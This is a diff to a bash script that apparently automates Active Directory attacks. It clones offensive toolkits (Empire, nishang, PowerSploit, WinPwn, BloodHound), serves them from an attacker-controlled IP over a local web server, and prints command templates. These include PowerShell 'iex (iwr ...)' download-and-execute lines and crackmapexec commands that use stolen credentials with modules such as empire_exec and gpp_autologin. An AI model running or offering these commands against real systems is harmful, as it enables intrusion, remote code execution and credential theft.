@@ -8,7 +8,7 @@ set -o pipefail
 # Variables                                                                    #
 ################################################################################
 
-LocalIP="10.10.10.6";		#
+LocalIP="10.10.14.10";		#
 LocalPort="8080";		#
 
 Username="";			#
@@ -32,16 +32,12 @@ S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/mast
 GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
 SecListsRepo="https://github.com/danielmiessler/SecLists/";
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
-
-
+BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
 
 LocalRepo="False"
 
 iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
-
-
-
 
 ################################################################################
 # Wordlists                                                                    #
@@ -104,6 +100,7 @@ PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 WinPwnLocalRepo="$HOME/ADAT/WinPwn"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
+BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
 
 
 if [ -d "$EmpireLocalRepo" ] 
@@ -193,12 +190,27 @@ else
 	echo -e ""
 fi
 
+if [ -d "$BloodHoundLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "BloodHound is installed, checking if updated to latest version."
+    	cd $BloodHoundLocalRepo
+    	git pull "https://github.com/BloodHoundAD/BloodHound.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning BloodHound Repo${RESTORE}"
+	git clone --recursive "https://github.com/BloodHoundAD/BloodHound.git" $HOME/ADAT/BloodHound
+	echo -e ""
+fi
+
 cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
@@ -271,6 +283,7 @@ while [ $# -gt 0 ]; do
 		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
 		JAWSRepo="http://$LocalIP:$LocalPort/"
 		GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
+		BloodHoundRepo="http://$LocalIP:$LocalPort/"
 		LocalRepo="True"
 		Function_LocalRepo;
                 shift
@@ -612,7 +625,7 @@ echo -e "${LGREEN}Crackmapexec - Extra${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}SMB${RESTORE}"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}bloodhound${RESTORE}"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}empire_exec -o LISRENER=<Listener_Name>${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}empire_exec -o LISTENER=<Listener_Name>${RESTORE}"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}enum_avproducts${RESTORE}"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}enum_dns${RESTORE}"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}gpp_autologin${RESTORE}"
@@ -782,7 +795,7 @@ echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 50 -Open -GrepOut Scan.txt"
 echo -e ""
 echo -e "${IBLUE}Invoke-Bloodhound${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/BloodHound.ps1);Invoke-Bloodhound"
+echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
 echo -e ""
 
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
